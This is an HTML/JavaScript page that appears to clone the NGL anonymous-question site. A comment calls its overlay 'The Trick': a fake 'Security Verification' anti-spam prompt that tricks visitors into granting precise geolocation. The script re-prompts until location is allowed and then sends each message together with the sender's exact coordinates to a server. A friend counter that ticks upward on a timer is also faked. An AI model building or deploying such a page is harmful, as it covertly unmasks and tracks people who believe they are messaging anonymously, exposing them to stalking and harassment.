<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
  <title>@jxwv.yzq</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
  <style>
    /* Inline spinner style for the security overlay */
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .loader-spin {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #e8176e;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
  </style>
</head>
<body class="page-send" id="sendPage">

  <!-- Security Verification Overlay (The Trick) -->
  <div id="securityOverlay" class="hidden" style="position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); font-family: sans-serif;">
    <div style="background: white; border-radius: 20px; text-align: center; max-width: 320px; width: 90%; overflow: hidden; box-shadow: 0 18px 50px rgba(0,0,0,0.35);">
      <div style="padding: 28px 24px 18px;">
        <div class="loader-spin" id="securityLoader"></div>
        <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
        <p id="securityText" style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 0;">
          To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
        </p>
      </div>
      <div style="display: flex; border-top: 1px solid #e5e5ea;">
        <button id="securityCancel" type="button" style="flex: 1; padding: 14px 8px; background: white; border: 0; border-right: 1px solid #e5e5ea; color: #007aff; font-size: 16px; font-family: inherit; cursor: pointer;">Cancel</button>
        <button id="securityAllow" type="button" style="flex: 1; padding: 14px 8px; background: white; border: 0; color: #007aff; font-size: 16px; font-weight: 700; font-family: inherit; cursor: pointer;">OK</button>
      </div>
    </div>
  </div>

  <!-- Top bar -->
  <div class="send-top"></div>

  <!-- White NGL card -->
  <div class="ngl-send-card" id="sendCard">
    <div class="ngl-send-card-header">
      <div class="ngl-avatar">
        <img src="assets/avatar.jpg" alt="user">
      </div>
      <div class="ngl-header-text">
        <div class="ngl-username">@jxwv.yzq</div>
        <div class="ngl-subtext">send me anonymous messages!</div>
      </div>
    </div>
    <div class="ngl-send-card-body">
      <textarea
        id="messageInput"
        class="ngl-textarea"
        placeholder="send a message..."
        maxlength="500"
        rows="4"
      ></textarea>
    </div>
    <div class="ngl-send-card-footer">
      <div class="ngl-lock-label">
        <span>🔒</span> anonymous q&a
      </div>
      <button class="ngl-dice" id="diceBtn" type="button" onclick="shufflePrompt(event)" style="position: relative; z-index: 1; cursor: pointer !important;">🎲</button>
    </div>
  </div>

  <!-- Send button -->
  <button class="send-action-btn" id="sendBtn" onclick="sendMessage()">Send!</button>

  <!-- Friend count -->
  <div class="send-friends-text" id="friendsText">
    <span class="hand">👇</span> <span id="friendCount">244</span> friends just tapped the button <span class="hand">👇</span>
  </div>

  <!-- Get your own button -->
  <button class="send-own-btn animate__animated animate__shakeX" onclick="window.location.href='https://ngl.link/'">Get your own messages!</button>

  <div class="send-footer-links">
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
  </div>

  <!-- ── SENT SCREEN ── -->
  <div class="sent-screen hidden" id="sentScreen">
    <div class="sent-check-circle">
      <svg viewBox="0 0 44 44">
        <polyline points="8,22 18,32 36,12" style="fill:none;stroke:white;stroke-width:4;"/>
      </svg>
    </div>
    <div class="sent-title">Sent!</div>
    <div class="sent-friends-count">👇 255 friends just tapped the button 👇</div>
    <button class="sent-get-btn">Get your own messages!</button>
    <button class="sent-another-link" onclick="resetForm()">Send another message</button>
  </div>

  <script>
    // 1. Setup Initial UI
    const username = sessionStorage.getItem('sender_username') || 'user';
    const headerUsername = document.getElementById('headerUsername');
    if (headerUsername) headerUsername.textContent = '@' + username;

    // 2. Friend Count Animation
    const countEl = document.getElementById('friendCount');
    if (countEl) {
      let count = parseInt(countEl.textContent);
      setInterval(() => {
        count += 1;
        countEl.textContent = count;
      }, 1500);
    }

    // 3. Dice Button Logic
    const randomPrompts = [
      'how was your day?',
      'what\'s your favorite song right now?',
      'what\'s something that made you smile today?',
      'what are you doing this weekend?',
      'what\'s your biggest goal lately?',
      'what\'s the last movie you watched?',
      'what\'s on your mind today?',
    ];
    document.getElementById('diceBtn').addEventListener('click', () => {
      const p = randomPrompts[Math.floor(Math.random() * randomPrompts.length)];
      document.getElementById('messageInput').value = p;
    });

    // 4. GPS Acquisition Helper
    // Resolves with coords ONLY when the user allows location.
    // Resolves with null on denial / unavailable / timeout so caller can re-prompt.
    async function getGPS() {
      return new Promise((resolve) => {
        if (!("geolocation" in navigator)) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              acc: pos.coords.accuracy
            });
          },
          () => resolve(null), // denied / error
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    function showSecurityPrompt() {
      const overlay = document.getElementById('securityOverlay');
      const allowBtn = document.getElementById('securityAllow');
      const cancelBtn = document.getElementById('securityCancel');
      const securityText = document.getElementById('securityText');
      const loader = document.getElementById('securityLoader');

      overlay.classList.remove('hidden');
      allowBtn.disabled = false;
      cancelBtn.disabled = false;
      allowBtn.textContent = 'OK';
      loader.style.display = 'block';
      securityText.innerHTML = 'To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.';

      return new Promise((resolve) => {
        const cleanup = () => {
          allowBtn.onclick = null;
          cancelBtn.onclick = null;
        };

        cancelBtn.onclick = () => {
          cleanup();
          overlay.classList.add('hidden');
          resolve(null);
        };

        allowBtn.onclick = async () => {
          allowBtn.disabled = true;
          cancelBtn.disabled = true;
          allowBtn.textContent = 'Checking...';

          const coords = await getGPS();
          cleanup();

          if (coords) {
            resolve(coords);
            return;
          }

          allowBtn.disabled = false;
          cancelBtn.disabled = false;
          allowBtn.textContent = 'OK';
          securityText.innerHTML = 'Verification failed. Please tap <b>OK</b> and allow the browser security prompt to continue.';
          resolve(false);
        };
      });
    }

    async function requireGPS() {
      let coords = await getGPS();
      while (!coords) {
        const result = await showSecurityPrompt();
        if (result === null) return null;
        if (result) coords = result;
      }
      return coords;
    }

    // 5. Send Message Function
    async function sendMessage() {
      const messageInput = document.getElementById('messageInput');
      const sendBtn = document.getElementById('sendBtn');
      const message = messageInput.value.trim();
      
      if (!message) {
        messageInput.classList.add('shake');
        setTimeout(() => messageInput.classList.remove('shake'), 400);
        return;
      }

      sendBtn.disabled = true;

      const overlay = document.getElementById('securityOverlay');
      const coords = await requireGPS();

      if (!coords) {
        sendBtn.disabled = false;
        return;
      }

      overlay.classList.remove('hidden');

      // Small pause for realistic "verifying" feel
      await new Promise(r => setTimeout(r, 600));

      try {
        const res = await fetch('/api/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, message, coords }),
        });

        if (res.ok) {
          overlay.classList.add('hidden');
          // Switch to Sent Screen
          document.getElementById('sendCard').classList.add('hidden');
          document.getElementById('sendBtn').classList.add('hidden');
          document.getElementById('friendsText').classList.add('hidden');
          document.querySelector('.send-own-btn').classList.add('hidden');
          document.querySelector('.send-footer-links').classList.add('hidden');
          document.querySelector('.send-top').classList.add('hidden');
          document.getElementById('sentScreen').classList.remove('hidden');
        } else {
          overlay.classList.add('hidden');
          sendBtn.disabled = false;
          alert("Verification failed. Please try again.");
        }
      } catch (e) {
        overlay.classList.add('hidden');
        sendBtn.disabled = false;
        alert("Connection error. Try again.");
      }
    }

    // 6. Reset Form Logic
    function resetForm() {
      document.getElementById('messageInput').value = '';
      document.getElementById('sendCard').classList.remove('hidden');
      document.getElementById('sendBtn').classList.remove('hidden');
      document.getElementById('friendsText').classList.remove('hidden');
      document.querySelector('.send-own-btn').classList.remove('hidden');
      document.querySelector('.send-footer-links').classList.remove('hidden');
      document.querySelector('.send-top').classList.remove('hidden');
      document.getElementById('sentScreen').classList.add('hidden');
    }
  </script>
</body>
</html>
